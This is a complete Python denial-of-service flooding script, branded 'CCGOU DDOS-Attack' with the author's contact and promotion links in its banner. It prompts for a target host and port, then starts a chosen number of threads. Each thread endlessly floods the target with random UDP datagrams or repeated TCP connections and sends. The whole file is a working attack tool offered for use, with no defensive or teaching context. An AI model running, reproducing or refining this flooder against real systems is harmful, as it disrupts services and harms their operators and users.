#!/usr/bin/env python3
#CCGOU
import random
import socket
import threading

print("""
      $$$$$$$\ $$$$$$$\  $$$$$$$\  $$$$$$\ $$     $$|
    $$  _____|$$  _____|$$  _____|$$  __$$\$$     $$|
    $$ /      $$ /      $$ /   __ $$ /  $$|$$     $$|
    $$ |      $$ |      $$ |  $$$|$$ |  $$|$$     $$|
    \$$$$$$$\ \$$$$$$$\  $$$$$$$ |\$$$$$$ |\$$$$$$$ /        
     \_______| \_______\ \_______| \______/ \______/     
----------------------------------------------------------
[*] CCGOU DDOS-Attack 
[*] Mail: ccgou@protonmail.com
[*]TG: https://t.me/ccgou_PASSDDOS
[*] Youtu: https://www.youtube.com/channel/UCEVVQOgZxgZvuXovtTV0COw
----------------------------------------------------------
""")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent to "+ ip)
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
